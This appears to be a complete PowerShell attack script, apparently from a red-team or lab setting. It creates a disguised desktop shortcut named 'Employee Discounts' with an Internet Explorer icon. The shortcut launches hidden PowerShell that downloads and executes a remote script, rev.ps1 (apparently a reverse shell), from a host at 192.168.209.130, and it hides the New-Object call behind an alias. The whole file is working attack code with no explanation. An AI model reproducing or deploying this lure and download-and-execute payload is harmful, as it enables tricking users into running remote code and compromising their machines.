$Target = 'http://192.168.209.130/rev.ps1'
$Payload = @" 
-command "& {New-Alias 'IS' New-Object; iex (IS System.Net.WebClient).DownloadString('$Target');Remove-Item alias:\IS}"
"@

$Shell = New-Object -ComObject ("WScript.Shell")
$Shortcut = $Shell.CreateShortcut($env:USERPROFILE + "\Desktop\Employee Discounts.lnk")
$Shortcut.TargetPath="%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.Arguments="$Payload"
$Shortcut.WindowStyle = 2;
$Shortcut.Description = "Employee Discounts";
$Shortcut.IconLocation = "C:\Program Files\Internet Explorer\iexplore.exe"
$Shortcut.Save()
